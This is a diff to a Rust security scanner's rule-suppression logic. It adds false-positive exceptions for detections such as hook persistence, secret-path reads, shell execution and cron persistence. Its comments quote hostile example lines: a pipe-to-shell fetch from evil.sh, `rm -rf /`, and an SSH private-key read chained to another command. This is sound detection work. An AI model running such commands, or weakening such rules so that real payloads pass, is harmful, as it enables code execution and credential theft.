@@ -857,7 +857,28 @@ fn suppress_match_in(
         // the script never wrote, is not an installation. The `persistence`
         // fixture writes `settings.json` through a heredoc body and must still
         // fire; a helper that only reads its own settings must not.
-        "PERSIST_HOOK" => !writes_somewhere || doc_in_docs || looks_like_test(&line),
+        // GOLD-v15 added the shapes a file-level write flag cannot see:
+        // `emit('UserPromptSubmit', text)` fires an event, `config["hooks"]
+        // ["FileChanged"][0]` walks a config, `[ -e "$REPO/.git/hooks/pre-commit"
+        // ]` tests one. A line that fires an event or navigates a structure is
+        // not the line that installs the hook.
+        "PERSIST_HOOK" => {
+            !writes_somewhere
+                || doc_in_docs
+                || looks_like_test(&line)
+                || (executable && {
+                    let after = raw_line
+                        .find(&m)
+                        .map(|i| raw_line[i + m.len()..].trim_start())
+                        .unwrap_or("");
+                    line.contains("emit(")
+                        || line.contains("trigger(")
+                        || after.starts_with('[')
+                        || line.contains("[ -e ")
+                        || line.contains("[ -f ")
+                        || line.contains("[ -d ")
+                })
+        }
         // `runtime.profile` is not `~/.profile`, and a printed example export
         // line is not a write to the user's shell. GOLD-v10 measured this rule at
         // 1/4 with exactly those two shapes.
@@ -987,8 +1008,10 @@ fn suppress_match(rule: &str, raw_line: &str, matched: &str, executable: bool) -
             // file extensions or English words need URL context; `com`/`net`/
             // `org` do not (GOLD-v2).
             const AMBIGUOUS: &[&str] = &[
+                // `.top` is a Three.js property (`camera.top`, `best.top`) as
+                // often as it is a TLD (GOLD-v15).
                 ".sh", ".app", ".info", ".dev", ".ai", ".io", ".co", ".me", ".so", ".cc", ".to",
-                ".tv", ".gg", ".live", ".site", ".online", ".cloud",
+                ".top", ".tv", ".gg", ".live", ".site", ".online", ".cloud",
                 // `.Net` is a namespace far more often than a host on these
                 // skills: `New-Object System.Net.HttpListener` and
                 // `[System.Net.HttpWebRequest]::Create(...)` were both reported
@@ -1043,6 +1066,12 @@ fn suppress_match(rule: &str, raw_line: &str, matched: &str, executable: bool) -
                 // A syntax listing (`<script src=...> / <link href=...>`) is
                 // documentation, not an embed (GOLD-v5).
                 || (line.contains("<script") && line.contains("<link"))
+            // An image inside inline code does not render, so it does not
+            // fetch: "Do not write `![xxx](https://…)`" names the syntax to
+            // avoid (GOLD-v17). Example *hosts* were tried and measured
+            // wrong: `![Remote image](https://example.com/image.jpg)`
+            // really is an embed — the image is fetched wherever it points —
+            // so four true positives came back and the host list went.
         }
         // "The skill writes agent configuration" needs a write. A line that only
         // names the path — a helper, a read, a commented example — is not a
@@ -1056,7 +1085,13 @@ fn suppress_match(rule: &str, raw_line: &str, matched: &str, executable: bool) -
         // still catches the indirection a real payload uses (`cat >
         // "$AGENT_DIR/settings.json"`), because there the directory is named.
         "PERSIST_AGENT_CONFIG" => {
-            !writes_to(&line, &m) || doc_in_docs || !names_agent_config(&line, &m)
+            !writes_to(&line, &m)
+                || doc_in_docs
+                || !names_agent_config(&line, &m)
+                // `--project <path>  Update AGENTS.md in target project
+                // (optional)` documents an option; it installs nothing
+                // (GOLD-v15).
+                || raw_line.trim_start().starts_with("--")
         }
         // `--index-url https://pypi.org/simple` is the default registry, not a
         // custom one.
@@ -1075,8 +1110,16 @@ fn suppress_match(rule: &str, raw_line: &str, matched: &str, executable: bool) -
         // `expect(tokenizeArgs("... curl evil.sh | sh"))` and
         // `assert.throws(() => mod.sanitizeCodexArgs(['; rm -rf /']))` were
         // reported as a pipe-to-shell and as a destructive command.
+        // `launch --command CMD  Launch a GUI command (schtasks /I …)` is a
+        // help line whose example sits in parentheses (GOLD-v15).
+        "PERSIST_CRON" => {
+            looks_like_test(&line)
+                || looks_like_usage(&line)
+                || command_in_docs
+                || parenthetical_mention(raw_line, &m)
+        }
         "DL_PIPE_TO_SHELL" | "SHELL_DESTRUCTIVE" | "SHELL_EVAL" | "NET_HTTP_CLIENT"
-        | "NET_FETCH_CALL" | "PERSIST_CRON" => {
+        | "NET_FETCH_CALL" => {
             looks_like_test(&line)
                 || looks_like_usage(&line)
                 || command_in_docs
@@ -1101,7 +1144,19 @@ fn suppress_match(rule: &str, raw_line: &str, matched: &str, executable: bool) -
                 || looks_like_test(&line)
         }
         // A read of a sensitive path is a path claim, not a command one.
-        "SECRET_PATH_READ" => looks_like_test(&line) || doc_in_docs,
+        "SECRET_PATH_READ" => {
+            looks_like_test(&line)
+                || doc_in_docs
+                // `"credentials.json missing client_id"` and "Token refresh
+                // failed. If credentials.json changed" are messages *about*
+                // the file (GOLD-v15). The discriminator is a literal that
+                // carries a space AND message vocabulary: a *staged command*
+                // is quoted with spaces too (`"cat ~/.ssh/id_rsa && …"` — the
+                // one true positive the first cut of this arm lost), so the
+                // words, not the whitespace, decide.
+                || (is_quoted_example(raw_line, matched)
+                    && quoted_literal_is_message(raw_line, matched))
+        }
         // `printenv` with no argument dumps every variable; `printenv HOME`
         // reads one by key (rev 30).
         // `printenv` alone prints everything; `printenv HOME` reads one key, and
@@ -1129,11 +1184,34 @@ fn suppress_match(rule: &str, raw_line: &str, matched: &str, executable: bool) -
                 || line.contains(".copy()")
                 || after.starts_with('.')
                 || after.starts_with('[')
+                // A parameter default hands the child the same environment the
+                // parent has — inheritance, not a dump: `function f(env =
+                // process.env)` and `env = os.environ if environ is None else
+                // environ`. GOLD-v15 measured both.
+                || after.starts_with(',')
+                || after.starts_with(" if ")
         }
         // `.env.example` and friends are templates the repository commits *on
         // purpose*, because they hold no secrets. The pattern matches up to
         // `.env`, so the suffix is read from the line (rev 28).
         "FS_SENSITIVE_PATH" => is_env_template_suffix(&line, &m),
+        // A line that instructs a license *review* mentions restrictive terms
+        // in order to flag them: `Check license compliance — flag copyleft
+        // licenses (GPL, AGPL) in proprietary …` (GOLD-v17). Presence rules fire
+        // in comments, but this is not a license declaration.
+        "LICENSE_RESTRICTIVE" => [
+            "compliance",
+            "flag",
+            "assess",
+            "audit",
+            "policy",
+            "eligib",
+            "allowlist",
+            "denylist",
+            "review",
+        ]
+        .iter()
+        .any(|w| line.contains(w)),
         // The canonical AWS documentation key is not a credential *anywhere*.
         // GOLD-v5 found it in a doc table; the pilot corpus then found the same
         // string in a security tool's own allowlist, in its comments, and in a
@@ -1170,11 +1248,60 @@ fn suppress_match(rule: &str, raw_line: &str, matched: &str, executable: bool) -
         // `import { spawn } from "node:child_process"`.
         "SHELL_EXEC" => {
             let t = line.trim_start();
+            // `subprocess.run(["soffice"] + args, env=env)` spawns an
+            // application; the claim is *another interpreter*. Without an
+            // interpreter marker somewhere on the line — `python`, `.sh`,
+            // `shell=True`, `osascript` — the pattern's own `subprocess.…`
+            // branch is a spawn of something unknown, and GOLD-v15 measured
+            // sixteen such lines as false positives.
+            if m.contains("subprocess.") {
+                const INTERPRETERS: &[&str] = &[
+                    "python",
+                    "node",
+                    "perl",
+                    "ruby",
+                    "php",
+                    "bash",
+                    "zsh",
+                    "/bin/sh",
+                    "sh -c",
+                    "shell=true",
+                    "shell = true",
+                    "osascript",
+                    "powershell",
+                    "pwsh",
+                    ".py",
+                    ".sh",
+                    ".js",
+                    ".mjs",
+                    ".cjs",
+                    ".ts",
+                    ".rb",
+                    ".pl",
+                    "npx",
+                    "bunx",
+                    "uv run",
+                    // `[sys.executable, SCRIPT, …]` re-invokes the interpreter
+                    // that is already running this script.
+                    "sys.executable",
+                    "executable,",
+                ];
+                if !INTERPRETERS.iter().any(|w| line.contains(w)) {
+                    return true;
+                }
+            }
             looks_like_usage(&line)
                 || (m.contains("child_process")
                     && (t.starts_with("import ")
                         || t.starts_with("from ")
-                        || line.contains("require(")))
+                        || line.contains("require(")
+                        // `const { execFile } = await import("child_process");`
+                        || line.contains("import(")))
+                // `which powershell.exe 2>/dev/null` probes for a binary; the
+                // backticks do run a shell, but the line's claim is a feature
+                // check (`return nil if …empty?`), not an invocation
+                // (GOLD-v17).
+                || (line.contains("which ") && (line.contains("empty") || line.contains("2>/dev/null")))
                 // `Write-Error "[plan-it] no plan.html found. Run: pwsh
                 // scripts\init-plan.ps1 <template>"` is advice printed at the
                 // operator, not an invocation (same shape as GOLD-v5's echo).
@@ -1447,6 +1574,58 @@ fn staged_payload(line: &str, matched: &str) -> bool {
 /// installer's payload line read as a usage line and suppressed the very
 /// finding the line-kind model was built to catch. A word boundary is the
 /// difference: `install.sh` is a filename, `sh install.sh` is an invocation.
+/// Is the match inside a parenthetical aside — `(schtasks /I)` — rather than
+/// the statement itself?
+fn parenthetical_mention(line: &str, matched: &str) -> bool {
+    let Some(at) = find_ci(line, matched.trim()) else {
+        return false;
+    };
+    let before = &line[..at];
+    let after = &line[at..];
+    // Shell grouping — `(crontab -l …) | crontab -` — also puts a `(` before
+    // the match, and it is the canonical cron-append idiom the fixture pins.
+    // A help line has prose and an option flag before the parenthetical.
+    match (before.rfind('('), before.rfind(')')) {
+        (Some(open), None) => open > 12 && before.contains(" --") && after.contains(')'),
+        (Some(open), Some(close)) if open > close => {
+            open > 12 && before.contains(" --") && after.contains(')')
+        }
+        _ => false,
+    }
+}
+
+/// Does the string literal around `matched` read like a *message* about the
+/// file rather than a reference to it? A path literal is a bare path
+/// (`open("credentials.json")`, or a composite `"$AGENT_DIR/settings.json"`); a
+/// staged command is quoted with spaces too (`"cat ~/.ssh/id_rsa && …"`), so
+/// message vocabulary decides, not whitespace.
+fn quoted_literal_is_message(line: &str, matched: &str) -> bool {
+    const WORDS: &[&str] = &[
+        "missing",
+        "failed",
+        "not found",
+        "invalid",
+        "required",
+        "error",
+        "refresh",
+        "changed",
+        "expired",
+        "denied",
+    ];
+    let Some(at) = find_ci(line, matched.trim()) else {
+        return false;
+    };
+    let Some((open_at, run)) = opening_quote_run(line, at) else {
+        return false;
+    };
+    let after = &line[at + matched.trim().len()..];
+    let close = after
+        .find(&line[open_at..open_at + run])
+        .unwrap_or(after.len());
+    let literal = &line[open_at + run..at + matched.trim().len() + close];
+    literal.contains(' ') && WORDS.iter().any(|w| literal.to_lowercase().contains(w))
+}
+
 fn contains_word(line: &str, word: &str) -> bool {
     let bytes = line.as_bytes();
     let mut from = 0;
